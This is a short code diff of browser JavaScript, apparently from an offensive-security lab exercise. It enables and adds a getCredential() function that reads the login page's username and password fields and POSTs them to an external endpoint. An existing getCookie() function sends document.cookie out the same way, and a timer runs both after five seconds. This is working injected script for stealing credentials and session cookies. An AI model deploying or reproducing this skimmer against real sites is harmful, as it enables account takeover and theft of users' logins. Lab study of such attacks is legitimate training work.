@@ -20,7 +20,7 @@ function actions(){
     setTimeout(function(){
         getContent();
         getCookie();
-        // getCredential();
+        getCredential();
     }, 5000);
 }
 
@@ -82,7 +82,7 @@ function validURL(str) {
     }
 }
 
-// Ex 10.6.4.2 - Extra Mile: API to save Credentials and Cookies
+// Ex 10.6.4.2 - Extra Mile: function to extract Cookies
 function getCookie() {
     // gets cookies
     let cookiesString = document.cookie;
@@ -103,5 +103,20 @@ function getCookie() {
             },
             method: "POST"
         })
+    })
+}
+
+// Ex 10.6.5.2 - Extra Mile: function to extract credentials
+function getCredential() {
+    // gets credentials
+    let user = document.getElementById("LoginUserUsername").value;
+    let pass = document.getElementById("LoginUserPassword").value;
+
+    fetch(api_credential, {
+        body: "user=" + encodeURIComponent(user) + "&pass=" + encodeURIComponent(pass),
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        method: "POST"
     })
 }
